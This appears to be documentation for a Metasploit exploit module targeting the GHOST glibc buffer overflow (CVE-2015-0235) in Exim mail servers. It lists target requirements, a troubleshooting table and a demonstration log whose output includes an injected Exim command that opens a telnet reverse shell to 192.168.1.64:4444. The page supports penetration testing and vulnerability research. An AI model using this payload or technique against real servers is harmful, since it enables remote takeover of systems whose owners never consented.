The Exim GHOST buffer overflow is a vulnerability found by researchers from Qualys. On March 17th 2015, Qualys released an exploit module demonstrating the exploitability of this flaw, which is now exim_gethostbyname_bof.rb in Metasploit Framework.

When Qualys released the exploit, it included a lot of technical details for debugging and usage purposes. We decided to put all that here in a more readable format.

## What is "GHOST"

This is a heap based buffer overflow found in GNU C Library's **g**et**host**byname functions since glibc-2.2 (November 10, 2000), which is part of the Linux operating system, such as: Debian, Red Hat, CentOS, and Ubuntu.

## Exploitable Requirements

**On the server-side (victim):**

* glibc-2.6 - glibc-2.17: The exploit depends on the newer versions' fd_nextsize (a member of the malloc_chunk structure) to remotely obtain the address of Exim's smtp_cmd_buffer in the heap.
* Exim server. The first exploitable version is Exim-4.77, maybe older. The exploit depends on the newer versions' 16-KB smtp_cmd_buffer to reliably set up the heap as described in the advisory.
* The Exim server also must enable helo_try_verify_hosts or helo_verify_hosts in the /etc/exim4/exim4.conf.template file. The "verify = helo" ACL might be exploitable too, but the attack vector isn't as reliable, therefore not supported by the module.

For testing purposes, if you need to find a vulnerable system, you can try Debian 7 (it should come with an exploitable Exim server):
http://ftp.cae.tntech.edu/debian-cd/dvd/debian-7.7.0-i386-DVD-1.iso

**On the attacker's side:**

* The attacker's IPv4 address must have both forward and reverse DNS entries that match each other (Forward-Confirmed reverse DNS).

## The check method

The GHOST exploit module comes with a check method. It is explicit, which means the check will actually try to trigger the vulnerability to determine if the host is vulnerable or not.

The check is also enforced when you use the "exploit" or "run" command. However, you can turn off the enforcement by setting the ```FORCE_EXPLOIT``` datastore option to true. For example:

```
set FORCE_EXPLOIT true
run
```

## Troubleshooting

If the exim_gethostbyname_bof.rb module has failed on you:

| Failure  | Explanation |
| -------- | ----------- |
| bad SENDER_HOST_ADDRESS (nil) | The SENDER_HOST_ADDRESS datastore option was not specified |
| bad SENDER_HOST_ADDRESS (not in IPv4 dotted-decimal notation) | The SENDER_HOST_ADDRESS datastore option was specified, but not in IPv4 dotted-decimal notation |
| bad SENDER_HOST_ADDRESS (helo_verify_hosts) | The SENDER_HOST_ADDRESS datastore option does not match the IPv4 address of the SMTP client (Metasploit), as seen by the SMTP server (Exim). |
| bad SENDER_HOST_ADDRESS (no FCrDNS) | the IPv4 address of the SMTP client (Metasploit) has no Forward-Confirmed reverse DNS. |
| not vuln? old glibc? (no leaked_arch) | the remote Exim server is either not vulnerable, or not exploitable (glibc versions older than glibc-2.6 have no fd_nextsize member in their malloc_chunk structure). |
| NUL, CR, LF in addr? (no leaked_addr) | Exim's heap address contains bad characters (NUL, CR, LF) and was therefore mangled during the information leak; this exploit is able to reconstruct most of these addresses, but not all (worst-case probability is ~1/85, but could be further improved). |
| Brute-force SUCCESS" followed by a nil reply, but no shell | the remote Unix command was executed, but spawned a bind-shell or a reverse-shell that failed to connect (maybe because of a firewall, or a NAT, etc). |
| Brute-force SUCCESS" followed by a non-nil reply, and no shell | The remote Unix command was executed, but failed to spawn the shell (maybe because the setsid command doesn't exist, or awk isn't gawk, or netcat doesn't support the -6 or -e option, or telnet doesn't support the -z option, etc). |

## Module Demonstration

When everything is dialed in correctly, a successful attack should look like the following:

```
msf exploit(exim_gethostbyname_bof) > run

[*] Started reverse double handler
[*] Trying information leak...
[!] {:heap_shift=>736}
[!] {:write_offset=>128, :error=>"503 sender not yet given"}
[!] {:write_offset=>136, :error=>"\xE0.\xFF\xB7\xE0.\xFF\xB7er not yet given"}
[!] {:error=>["\xE0.\xFF\xB7\xE0.\xFF\xB7er not yet given", "", "503 \x89\x10", "177", "177\\177\\177", "vJN\\177\\177\\177\\177"]}
[!] {:leaked_arch=>"x86"}
[!] {:count=>{"\xE0.\xFF\xB7\xE0.\xFF\xB7er not yet given"=>8, "hF\xFE\xB7hF\xFE\xB7er not yet given"=>2}}
[+] Successfully leaked_arch: x86
[+] Successfully leaked_addr: b7fda760
[*] Trying code execution...
[!] ${run{/usr/bin/env setsid /bin/sh -c "sh -c '(sleep 4011|telnet 192.168.1.64 4444|while : ; do sh && break; done 2>&1|telnet 192.168.1.64 4444 >/dev/null 2>&1 &)'"}}
[!] {:helo=>6144, :step=>6025, :addr=>"b7fda760", :offset=>21}
[!] {:reply=>{:code=>"250", :lines=>["250 Accepted\r\n"]}}
[!] {:helo=>6144, :step=>6025, :addr=>"b7fda760", :offset=>25}
[!] {:reply=>{:code=>"250", :lines=>["250 Accepted\r\n"]}}
[!] {:helo=>6144, :step=>6025, :addr=>"b7fd8fd7", :offset=>20}
[!] {:helo=>6144, :step=>6025, :addr=>"b7fd8fd7", :offset=>8}
[!] {:helo=>6144, :step=>6025, :addr=>"b7fd784e", :offset=>6}
[!] {:helo=>6144, :step=>6025, :addr=>"b7fd784e", :offset=>12}
[!] {:helo=>6144, :step=>6025, :addr=>"b7fd60c5", :offset=>19}
[!] {:helo=>6144, :step=>6025, :addr=>"b7fd60c5", :offset=>29}
[!] {:helo=>6144, :step=>6025, :addr=>"b7fd493c", :offset=>23}
[!] {:helo=>6144, :step=>6025, :addr=>"b7fd493c", :offset=>18}
[!] {:helo=>6144, :step=>6025, :addr=>"b7fd31b3", :offset=>14}
[!] {:helo=>6144, :step=>6025, :addr=>"b7fd31b3", :offset=>3}
[!] {:helo=>6144, :step=>6025, :addr=>"b7fd1a2a", :offset=>29}
[!] {:helo=>6144, :step=>6025, :addr=>"b7fd1a2a", :offset=>28}
[!] {:helo=>6144, :step=>6025, :addr=>"b7fd02a1", :offset=>26}
[!] {:reply=>{:code=>"550", :lines=>["550 sikVtqGxFOjCBOWTbDupmIuJRmLmShFNqqUYRRPUolyxPmmgLCenEzConuVGWafjgycyRfXulGNwmAOvkqZkGobMyUIMPojZsaziCjVVyvabOrcieEWrLZSgnCCXHeXjIzGGfUALAIubgBEmsKsSWSGa\r\n"]}}
[+] Brute-force SUCCESS
[+] Please wait for reply...
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo qaNpBmRBEus9XoVZ;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket A
[*] A: "qaNpBmRBEus9XoVZ\r\n"
[*] Matching...
[*] B is input...
[*] Command shell session 1 opened (192.168.1.64:4444 -> 192.168.1.166:58859) at 2015-03-19 03:36:52 -0500
[!] {:reply=>nil}

id
uid=104(Debian-exim) gid=112(Debian-exim) groups=112(Debian-exim)
```

## References:

* https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-0235
* https://community.qualys.com/blogs/laws-of-vulnerabilities/2015/03/17/ghost-remote-code-execution-exploit
* https://www.qualys.com/research/security-advisories/GHOST-CVE-2015-0235.txt?_ga=1.171218720.101498705.1426692159
* https://www.qualys.com/research/security-advisories/GHOST-CVE-2015-0235.txt?_ga=1.136230833.101498705.1426692159